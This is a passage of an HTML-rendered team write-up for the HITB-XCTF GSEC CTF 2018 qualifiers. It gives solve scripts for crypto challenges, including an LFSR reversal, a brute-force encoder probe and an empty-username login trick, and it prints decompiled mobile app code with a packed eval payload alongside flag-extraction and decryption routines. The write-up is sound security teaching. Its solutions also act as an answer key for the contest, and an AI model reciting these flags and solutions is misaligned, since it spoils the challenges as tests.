long_to_bytes(bytes_to_long(<span class="hljs-string">b'\x00\xff'</span>)) == <span class="hljs-string">b'\xff'</span>
</code></pre><p>If we register with empty username, it will give us secret <code>admin_k</code> when we login. DONE.</p><h3 id="streamgamex-sasdf" style=""><a class="anchor hidden-xs" href="#streamgamex-sasdf" title="streamgamex-sasdf"><span class="octicon octicon-link"></span></a>streamgamex (sasdf)</h3><p>Use first 24 bits of output as state. Run in reverse direction to get lower 24 bits of initial state (i.e. flag). Bruteforce first 17 bits that satisfy sha256 given in hint.</p><pre><code class="python hljs">mask = <span class="hljs-number">0b10110110110011010111001101011010101011011</span>
<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">24</span>):
    lastbit = state &amp; <span class="hljs-number">1</span>
    state &gt;&gt;= <span class="hljs-number">1</span>
    i = (state &amp; mask)
    <span class="hljs-keyword">while</span> i!=<span class="hljs-number">0</span>:
        lastbit^=(i&amp;<span class="hljs-number">1</span>)
        i=i&gt;&gt;<span class="hljs-number">1</span>
    state|=(lastbit&lt;&lt;<span class="hljs-number">23</span>)
    print(<span class="hljs-string">'State: %s'</span> % bin(state)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">24</span>, <span class="hljs-string">'0'</span>))
state = bin(state)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">24</span>, <span class="hljs-string">'0'</span>)
</code></pre><h3 id="base-how2hack" style=""><a class="anchor hidden-xs" href="#base-how2hack" title="base-how2hack"><span class="octicon octicon-link"></span></a>base (how2hack)</h3><p>This challenge let user input one string and output the “encoded” string.<br>
Our goal is to decode the given string, which is the flag: <code>2SiG5c9KCepoPA3iCyLHPRJ25uuo4AvD2/7yPHj2ReCofS9s47LU39JDRSU=</code></p><p>From the challenge name, I quickly think of base64 and other similar encoding algorithm. However I can’t really tell how it works as it encodes the string totally different as the usual one.</p><p>I try to spam some string and see what I can get, and I think Brute Forcing may help.</p><p>Note: I try to scan through all the ASCII (256 possibilities), but after some tries I noted that the flag is only contains hex (16 possibilities).</p><p>Here is the script how I attempt to brute force:</p><pre><code class="python hljs">flag = <span class="hljs-string">'2SiG5c9KCepoPA3iCyLHPRJ25uuo4AvD2/7yPHj2ReCofS9s47LU39JDRSU='</span>
possibilities = range(<span class="hljs-number">0x30</span>, <span class="hljs-number">0x3a</span>)          <span class="hljs-comment"># 0-9</span>
possibilities.extend(range(<span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>))    <span class="hljs-comment"># a-f</span>
choose = <span class="hljs-string">''</span>
<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
    <span class="hljs-keyword">print</span> flag
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> possibilities:
        r.sendline(choose+chr(i))
        <span class="hljs-keyword">print</span> r.recvline().strip()
    choose = raw_input().strip()
</code></pre><p>Flag: <code>HITB{5869616f6d6f40466c61707079506967}</code></p><pre><code>&gt;&gt;&gt; '5869616f6d6f40466c61707079506967'.decode('hex')
'Xiaomo@FlappyPig'
</code></pre><p>Hi Xiaomo :)…</p><h2 id="mobile" style=""><a class="anchor hidden-xs" href="#mobile" title="mobile"><span class="octicon octicon-link"></span></a>mobile</h2><h3 id="kivy-simple-sces60107" style=""><a class="anchor hidden-xs" href="#kivy-simple-sces60107" title="kivy-simple-sces60107"><span class="octicon octicon-link"></span></a>kivy simple (sces60107)</h3><p>First I extract the <code>classes.dex</code> and try analyse the code.</p><p>Eventually I found that this apk is using python.</p><p>The python script is hidden in the <code>private.mp3</code></p><p>Though the scripts is compiled, you can use <code>uncompyle2</code>.</p><p>Now we have the <a href="http://main.py" target="_blank">main.py</a></p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span>
<span data-linenumber="9"></span>
<span data-linenumber="10"></span>
<span data-linenumber="11"></span>
<span data-linenumber="12"></span>
<span data-linenumber="13"></span>
<span data-linenumber="14"></span>
<span data-linenumber="15"></span>
<span data-linenumber="16"></span>
<span data-linenumber="17"></span>
<span data-linenumber="18"></span>
<span data-linenumber="19"></span>
<span data-linenumber="20"></span>
<span data-linenumber="21"></span>
<span data-linenumber="22"></span>
<span data-linenumber="23"></span>
<span data-linenumber="24"></span>
<span data-linenumber="25"></span>
<span data-linenumber="26"></span>
<span data-linenumber="27"></span>
<span data-linenumber="28"></span>
<span data-linenumber="29"></span>
<span data-linenumber="30"></span>
<span data-linenumber="31"></span>
<span data-linenumber="32"></span>
<span data-linenumber="33"></span>
<span data-linenumber="34"></span>
<span data-linenumber="35"></span>
<span data-linenumber="36"></span>
<span data-linenumber="37"></span>
<span data-linenumber="38"></span>
<span data-linenumber="39"></span>
<span data-linenumber="40"></span>
<span data-linenumber="41"></span>
<span data-linenumber="42"></span>
<span data-linenumber="43"></span>
<span data-linenumber="44"></span>
<span data-linenumber="45"></span>
<span data-linenumber="46"></span>
<span data-linenumber="47"></span>
<span data-linenumber="48"></span>
<span data-linenumber="49"></span></div><div class="code"><span class="hljs-keyword">from</span> kivy.uix.popup <span class="hljs-keyword">import</span> Popup
<span class="hljs-keyword">from</span> kivy.app <span class="hljs-keyword">import</span> App
<span class="hljs-keyword">from</span> kivy.uix.label <span class="hljs-keyword">import</span> Label
<span class="hljs-keyword">from</span> kivy.uix.textinput <span class="hljs-keyword">import</span> TextInput
<span class="hljs-keyword">from</span> kivy.uix.button <span class="hljs-keyword">import</span> Button
<span class="hljs-keyword">from</span> kivy.uix.boxlayout <span class="hljs-keyword">import</span> BoxLayout
<span class="hljs-keyword">import</span> binascii
<span class="hljs-keyword">import</span> marshal
<span class="hljs-keyword">import</span> zlib

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginScreen</span><span class="hljs-params">(BoxLayout)</span>:</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, **kwargs)</span>:</span>
        super(LoginScreen, self).__init__(**kwargs)
        self.orientation = <span class="hljs-string">'vertical'</span>
        self.add_widget(Label(text=<span class="hljs-string">'FLAG'</span>))
        self.flag = TextInput(hint_text=<span class="hljs-string">'FLAG HERE'</span>, multiline=<span class="hljs-keyword">False</span>)
        self.add_widget(self.flag)
        self.hello = Button(text=<span class="hljs-string">'CHECK'</span>)
        self.hello.bind(on_press=self.auth)
        self.add_widget(self.hello)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">if</span> self.flag.text == <span class="hljs-string">'HITB{this_is_not_flag}'</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">auth</span><span class="hljs-params">(self, instance)</span>:</span>
        <span class="hljs-keyword">if</span> self.check():
            s = <span class="hljs-string">'Congratulations you got the flag'</span>
        <span class="hljs-keyword">else</span>:
            s = <span class="hljs-string">'Wrong answer'</span>
        popup = Popup(title=<span class="hljs-string">'result'</span>, content=Label(text=s), auto_dismiss=<span class="hljs-keyword">True</span>)
        popup.open()


screen = LoginScreen()
b64 = <span class="hljs-string">'eJzF1MtOE2EUB/DzTculUKAUKJSr3OqIV0TBGEOMRqIuatJhowsndTrVA+MlnYEYhZXEhQuXLlz4CC58BBc+ggsfwYWPYDznhHN8BJr5Tv7fby6Z8/VrIzj+eDRu0kirVFoARwCPAGI6HOx4EBI6CHy+LHLH1/O4zfd8onQAsEOHg0MHmQcHDt45vmc3B50FyHIQELU8qLZyYutmebIusftm3WQ9Yo/NeskKYh2zPrJ+sfdmRbIBsc9mg2RDYl/NSmTDYt/NymQjYj/NRsnGxH6bVcjGxf6aTZBVxcpObdL6rZlNkU2LXTebsT7qZrP2fk/M5shOie2bzdvzPpgtkC2KfTFbIlsW+2ZWIzst9sPMJzsj9stsheys2B+zc2TnxTxP7YL1UTG7aLZidolsVWzT7LL11jBbI7si1ja7SrYu9sZsw+yjWJaHgHZx4F+j/VnHOao4TCXjvbuBQxqXsV9jgDmNt7CiMURP4zZOaXyA3RrncVTjEpY0djCv8S2Oa3yF/OtC0PldLPN8hkuf4ioO8nxA5zWc1LiITuM97NG4hbMaD3FE4z4W+TEFLhOKD7GL59M6r+OYxjXsperz+YzfvZ00n0rI4tdZxkuTxC8yPr3VTNJYTm139mL5S5BZGidteVTqc4dSMil8V/Qsjnb52vSIzRVdGfKu5E5seHWfu2rw3sj460yjTkwt8oqFYZQ00zQM/3cipSErzQt14/nL1l4Sb0pHXAp3/gENPMQt'</span>
eval(marshal.loads(zlib.decompress(binascii.a2b_base64(b64))))

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyApp</span><span class="hljs-params">(App)</span>:</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">return</span> screen


app = MyApp()
app.run()

</div></div></code></pre><p>There is a second stage. But it is not difficult to understand.</p><p>The following is the script to extract flag</p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span>
<span data-linenumber="9"></span>
<span data-linenumber="10"></span>
<span data-linenumber="11"></span>
<span data-linenumber="12"></span>
<span data-linenumber="13"></span>
<span data-linenumber="14"></span>
<span data-linenumber="15"></span>
<span data-linenumber="16"></span>
<span data-linenumber="17"></span>
<span data-linenumber="18"></span>
<span data-linenumber="19"></span>
<span data-linenumber="20"></span>
<span data-linenumber="21"></span></div><div class="code"><span class="hljs-keyword">import</span> zlib
<span class="hljs-keyword">import</span> marshal
<span class="hljs-keyword">import</span> dis
b64 = <span class="hljs-string">'eJzF1MtOE2EUB/DzTculUKAUKJSr3OqIV0TBGEOMRqIuatJhowsndTrVA+MlnYEYhZXEhQuXLlz4CC58BBc+ggsfwYWPYDznhHN8BJr5Tv7fby6Z8/VrIzj+eDRu0kirVFoARwCPAGI6HOx4EBI6CHy+LHLH1/O4zfd8onQAsEOHg0MHmQcHDt45vmc3B50FyHIQELU8qLZyYutmebIusftm3WQ9Yo/NeskKYh2zPrJ+sfdmRbIBsc9mg2RDYl/NSmTDYt/NymQjYj/NRsnGxH6bVcjGxf6aTZBVxcpObdL6rZlNkU2LXTebsT7qZrP2fk/M5shOie2bzdvzPpgtkC2KfTFbIlsW+2ZWIzst9sPMJzsj9stsheys2B+zc2TnxTxP7YL1UTG7aLZidolsVWzT7LL11jBbI7si1ja7SrYu9sZsw+yjWJaHgHZx4F+j/VnHOao4TCXjvbuBQxqXsV9jgDmNt7CiMURP4zZOaXyA3RrncVTjEpY0djCv8S2Oa3yF/OtC0PldLPN8hkuf4ioO8nxA5zWc1LiITuM97NG4hbMaD3FE4z4W+TEFLhOKD7GL59M6r+OYxjXsperz+YzfvZ00n0rI4tdZxkuTxC8yPr3VTNJYTm139mL5S5BZGidteVTqc4dSMil8V/Qsjnb52vSIzRVdGfKu5E5seHWfu2rw3sj460yjTkwt8oqFYZQ00zQM/3cipSErzQt14/nL1l4Sb0pHXAp3/gENPMQt'</span>
a=marshal.loads(zlib.decompress((b64).decode(<span class="hljs-string">"base64"</span>)))

flag=[<span class="hljs-string">"?"</span>]*<span class="hljs-number">50</span>                     <span class="hljs-comment"># initialize flag string</span>
n=a.co_consts[<span class="hljs-number">0</span>].co_consts        <span class="hljs-comment"># the const contains flag byte and index byte</span>
code=a.co_consts[<span class="hljs-number">0</span>].co_code[<span class="hljs-number">34</span>:]  <span class="hljs-comment"># extract useful bytecode</span>

<span class="hljs-comment"># Now we can reconstruct the flag</span>
<span class="hljs-keyword">while</span> code.find(<span class="hljs-string">"|\x01\x00d"</span>)!=<span class="hljs-number">-1</span>:
  pos=code.find(<span class="hljs-string">"|\x01\x00d"</span>)
  code=code[pos:]
  i=ord(code[<span class="hljs-number">4</span>])
  j=ord(code[<span class="hljs-number">8</span>])
  <span class="hljs-comment">#the first is index, the second is flag</span>
  flag[n[i]]=n[j]
  code=code[<span class="hljs-number">1</span>:]
<span class="hljs-keyword">print</span> <span class="hljs-string">""</span>.join(flag)

</div></div></code></pre><p>The flag is <code>HITB{1!F3_1S_&amp;H%r7_v$3_pY7#ON!}</code></p><h3 id="multicheck-sasdf" style=""><a class="anchor hidden-xs" href="#multicheck-sasdf" title="multicheck-sasdf"><span class="octicon octicon-link"></span></a>multicheck (sasdf)</h3><p>Extract <code>claz.dex</code> from <code>lib/libcheck.so</code> by xor with increasing byte stream started with 233 (i.e. i=233; i++). Run the inverse of algorithm in <code>claz.dex</code> to uncover input string.</p><pre><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decBlock</span><span class="hljs-params">(a, b)</span>:</span>
    i5 = np.int32(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>):
        i5 -= np.int32(<span class="hljs-number">1640531527</span>)
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>):
        b -= (((a &lt;&lt; np.int32(<span class="hljs-number">4</span>)) + coeff[<span class="hljs-number">2</span>]) ^ (a + i5)) ^ ((a &gt;&gt; np.int32(<span class="hljs-number">5</span>)) + coeff[<span class="hljs-number">3</span>])
        a -= (((b &lt;&lt; np.int32(<span class="hljs-number">4</span>)) + coeff[<span class="hljs-number">0</span>]) ^ (b + i5)) ^ ((b &gt;&gt; np.int32(<span class="hljs-number">5</span>)) + coeff[<span class="hljs-number">1</span>])
        i5 += np.int32(<span class="hljs-number">1640531527</span>)
    <span class="hljs-keyword">return</span> int(a), int(b)
</code></pre></div>
    <div class="ui-toc dropup unselectable hidden-print" style="display:none;">
        <div class="pull-right dropdown">
            <a id="tocLabel" class="ui-toc-label btn btn-default" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content">
                <i class="fa fa-bars"></i>
            </a>
            <ul id="ui-toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel">
                <div class="toc"><ul class="nav"><li class=""><a href="#HITB-XCTF-GSEC-CTF-2018-Quals" title="HITB-XCTF GSEC CTF 2018 Quals">HITB-XCTF GSEC CTF 2018 Quals</a><ul class="nav"><li><a href="#rev" title="rev">rev</a><ul class="nav"><li><a href="#hacku-sces60107" title="hacku (sces60107)">hacku (sces60107)</a></li><li><a href="#sdsun-sces60107-sasdf" title="sdsun (sces60107 sasdf)">sdsun (sces60107 sasdf)</a></li><li><a href="#hex-sasdf" title="hex (sasdf)">hex (sasdf)</a></li></ul></li><li><a href="#misc" title="misc">misc</a><ul class="nav"><li><a href="#tpyx-sces60107" title="tpyx (sces60107)">tpyx (sces60107)</a></li><li><a href="#readfile-sces60107" title="readfile (sces60107)">readfile (sces60107)</a></li><li><a href="#pix-sces60107" title="pix (sces60107)">pix (sces60107)</a></li></ul></li><li><a href="#pwn" title="pwn">pwn</a><ul class="nav"><li><a href="#once-kevin47" title="once (kevin47)">once (kevin47)</a></li><li><a href="#gundam-kevin47" title="gundam (kevin47)">gundam (kevin47)</a></li><li><a href="#d-kevin47" title="d (kevin47)">d (kevin47)</a></li><li><a href="#babypwn-how2hack" title="babypwn (how2hack)">babypwn (how2hack)</a></li></ul></li><li><a href="#web" title="web">web</a><ul class="nav"><li><a href="#Upload-bookgin" title="Upload (bookgin)">Upload (bookgin)</a></li><li><a href="#Python’s-revenge-sasdf" title="Python’s revenge (sasdf)">Python’s revenge (sasdf)</a></li><li><a href="#PHP-lover-bookgin-amp-sces60107" title="PHP lover (bookgin &amp; sces60107)">PHP lover (bookgin &amp; sces60107)</a></li><li><a href="#baby-baby-bookgin" title="baby baby (bookgin)">baby baby (bookgin)</a></li><li><a href="#baby-nya-bookgin" title="baby nya (bookgin)">baby nya (bookgin)</a></li><li><a href="#baby-fs-unsolved-written-by-bookgin-thanks-to-the-organizer-QQ-group" title="baby fs (unsolved, written by bookgin, thanks to the organizer QQ group)">baby fs (unsolved, written by bookgin, thanks to the organizer QQ group)</a></li><li><a href="#3pigs-unsolved-written-by-how2hack" title="3pigs (unsolved, written by how2hack)">3pigs (unsolved, written by how2hack)</a></li></ul></li><li><a href="#crypto" title="crypto">crypto</a><ul class="nav"><li><a href="#easy_block-sasdf" title="easy_block (sasdf)">easy_block (sasdf)</a></li><li><a href="#easy_pub-sasdf" title="easy_pub (sasdf)">easy_pub (sasdf)</a></li><li><a href="#streamgamex-sasdf" title="streamgamex (sasdf)">streamgamex (sasdf)</a></li><li><a href="#base-how2hack" title="base (how2hack)">base (how2hack)</a></li></ul></li><li><a href="#mobile" title="mobile">mobile</a><ul class="nav"><li><a href="#kivy-simple-sces60107" title="kivy simple (sces60107)">kivy simple (sces60107)</a></li><li><a href="#multicheck-sasdf" title="multicheck (sasdf)">multicheck (sasdf)</a></li></ul></li></ul></li></ul></div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
            </ul>
        </div>
    </div>
    <div id="ui-toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print" data-spy="affix" style="top:17px;display:none;"  >
        <div class="toc"><ul class="nav"><li class=""><a href="#HITB-XCTF-GSEC-CTF-2018-Quals" title="HITB-XCTF GSEC CTF 2018 Quals">HITB-XCTF GSEC CTF 2018 Quals</a><ul class="nav"><li><a href="#rev" title="rev">rev</a><ul class="nav"><li><a href="#hacku-sces60107" title="hacku (sces60107)">hacku (sces60107)</a></li><li><a href="#sdsun-sces60107-sasdf" title="sdsun (sces60107 sasdf)">sdsun (sces60107 sasdf)</a></li><li><a href="#hex-sasdf" title="hex (sasdf)">hex (sasdf)</a></li></ul></li><li><a href="#misc" title="misc">misc</a><ul class="nav"><li><a href="#tpyx-sces60107" title="tpyx (sces60107)">tpyx (sces60107)</a></li><li><a href="#readfile-sces60107" title="readfile (sces60107)">readfile (sces60107)</a></li><li><a href="#pix-sces60107" title="pix (sces60107)">pix (sces60107)</a></li></ul></li><li><a href="#pwn" title="pwn">pwn</a><ul class="nav"><li><a href="#once-kevin47" title="once (kevin47)">once (kevin47)</a></li><li><a href="#gundam-kevin47" title="gundam (kevin47)">gundam (kevin47)</a></li><li><a href="#d-kevin47" title="d (kevin47)">d (kevin47)</a></li><li><a href="#babypwn-how2hack" title="babypwn (how2hack)">babypwn (how2hack)</a></li></ul></li><li><a href="#web" title="web">web</a><ul class="nav"><li><a href="#Upload-bookgin" title="Upload (bookgin)">Upload (bookgin)</a></li><li><a href="#Python’s-revenge-sasdf" title="Python’s revenge (sasdf)">Python’s revenge (sasdf)</a></li><li><a href="#PHP-lover-bookgin-amp-sces60107" title="PHP lover (bookgin &amp; sces60107)">PHP lover (bookgin &amp; sces60107)</a></li><li><a href="#baby-baby-bookgin" title="baby baby (bookgin)">baby baby (bookgin)</a></li><li><a href="#baby-nya-bookgin" title="baby nya (bookgin)">baby nya (bookgin)</a></li><li><a href="#baby-fs-unsolved-written-by-bookgin-thanks-to-the-organizer-QQ-group" title="baby fs (unsolved, written by bookgin, thanks to the organizer QQ group)">baby fs (unsolved, written by bookgin, thanks to the organizer QQ group)</a></li><li><a href="#3pigs-unsolved-written-by-how2hack" title="3pigs (unsolved, written by how2hack)">3pigs (unsolved, written by how2hack)</a></li></ul></li><li><a href="#crypto" title="crypto">crypto</a><ul class="nav"><li><a href="#easy_block-sasdf" title="easy_block (sasdf)">easy_block (sasdf)</a></li><li><a href="#easy_pub-sasdf" title="easy_pub (sasdf)">easy_pub (sasdf)</a></li><li><a href="#streamgamex-sasdf" title="streamgamex (sasdf)">streamgamex (sasdf)</a></li><li><a href="#base-how2hack" title="base (how2hack)">base (how2hack)</a></li></ul></li><li><a href="#mobile" title="mobile">mobile</a><ul class="nav"><li><a href="#kivy-simple-sces60107" title="kivy simple (sces60107)">kivy simple (sces60107)</a></li><li><a href="#multicheck-sasdf" title="multicheck (sasdf)">multicheck (sasdf)</a></li></ul></li></ul></li></ul></div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha256-U5ZEeKfGNOja007MMD3YBI0A3OSZOQbeG6z2f2Y0hu8=" crossorigin="anonymous" defer></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gist-embed/2.6.0/gist-embed.min.js" integrity="sha256-KyF2D6xPIJUW5sUDSs93vWyZm+1RzIpKCexxElmxl8g=" crossorigin="anonymous" defer></script>
    <script>
        var markdown = $(".markdown-body");
        //smooth all hash trigger scrolling
        function smoothHashScroll() {
            var hashElements = $("a[href^='#']").toArray();
            for (var i = 0; i < hashElements.length; i++) {
                var element = hashElements[i];
                var $element = $(element);
                var hash = element.hash;
                if (hash) {
                    $element.on('click', function (e) {
                        // store hash
                        var hash = this.hash;
                        if ($(hash).length <= 0) return;
                        // prevent default anchor click behavior
                        e.preventDefault();
                        // animate
                        $('body, html').stop(true, true).animate({
                            scrollTop: $(hash).offset().top
                        }, 100, "linear", function () {
                            // when done, add hash to url
                            // (default click behaviour)
                            window.location.hash = hash;
                        });
                    });
                }
            }
        }

        smoothHashScroll();
        var toc = $('.ui-toc');
        var tocAffix = $('.ui-affix-toc');
        var tocDropdown = $('.ui-toc-dropdown');
        //toc
        tocDropdown.click(function (e) {
            e.stopPropagation();
        });

        var enoughForAffixToc = true;

        function generateScrollspy() {
            $(document.body).scrollspy({
                target: ''
            });
            $(document.body).scrollspy('refresh');
            if (enoughForAffixToc) {
                toc.hide();
                tocAffix.show();
            } else {
                tocAffix.hide();
                toc.show();
            }
            $(document.body).scroll();
        }

        function windowResize() {
            //toc right
            var paddingRight = parseFloat(markdown.css('padding-right'));
            var right = ($(window).width() - (markdown.offset().left + markdown.outerWidth() - paddingRight));
            toc.css('right', right + 'px');
            //affix toc left
            var newbool;
            var rightMargin = (markdown.parent().outerWidth() - markdown.outerWidth()) / 2;
            //for ipad or wider device
            if (rightMargin >= 133) {
                newbool = true;
                var affixLeftMargin = (tocAffix.outerWidth() - tocAffix.width()) / 2;
                var left = markdown.offset().left + markdown.outerWidth() - affixLeftMargin;
                tocAffix.css('left', left + 'px');
            } else {
                newbool = false;
            }
            if (newbool != enoughForAffixToc) {
                enoughForAffixToc = newbool;
                generateScrollspy();
            }
        }
        $(window).resize(function () {
            windowResize();
        });
        $(document).ready(function () {
            windowResize();
            generateScrollspy();
        });

        //remove hash
        function removeHash() {
            window.location.hash = '';
        }

        var backtotop = $('.back-to-top');
        var gotobottom = $('.go-to-bottom');

        backtotop.click(function (e) {
            e.preventDefault();
            e.stopPropagation();
            if (scrollToTop)
                scrollToTop();
            removeHash();
        });
        gotobottom.click(function (e) {
            e.preventDefault();
            e.stopPropagation();
            if (scrollToBottom)
                scrollToBottom();
            removeHash();
        });

        var toggle = $('.expand-toggle');
        var tocExpand = false;

        checkExpandToggle();
        toggle.click(function (e) {
            e.preventDefault();
            e.stopPropagation();
            tocExpand = !tocExpand;
            checkExpandToggle();
        })

        function checkExpandToggle () {
            var toc = $('.ui-toc-dropdown .toc');
            var toggle = $('.expand-toggle');
            if (!tocExpand) {
                toc.removeClass('expand');
                toggle.text('Expand all');
            } else {
                toc.addClass('expand');
                toggle.text('Collapse all');
            }
        }

        function scrollToTop() {
            $('body, html').stop(true, true).animate({
                scrollTop: 0
            }, 100, "linear");
        }

        function scrollToBottom() {
            $('body, html').stop(true, true).animate({
                scrollTop: $(document.body)[0].scrollHeight
            }, 100, "linear");
        }
    </script>
</body>

</html>
